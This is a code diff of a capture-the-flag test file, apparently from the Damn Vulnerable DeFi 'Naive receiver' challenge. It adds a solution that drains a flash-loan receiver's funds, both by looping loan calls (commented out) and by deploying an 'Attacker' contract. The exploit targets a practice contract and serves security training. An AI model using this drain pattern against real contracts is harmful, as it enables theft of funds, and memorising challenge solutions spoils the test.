@@ -30,7 +30,20 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+        
+        // Naive solution
+        /* 
+        for (let i = 0; i <= 9; i++) {
+            await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from("1000000000000000000"));
+            console.log(`RECEIVER BALANCE AFTER RETURNING ::: ${await ethers.provider.getBalance(this.receiver.address)}`);
+        }     
+        */                    
+                
+        const attackerFactory = await ethers.getContractFactory('Attacker', attacker);
+        const attackerContract = await attackerFactory.deploy(this.pool.address, this.receiver.address);                
+        await attackerContract.attack();
+
     });
 
     after(async function () {
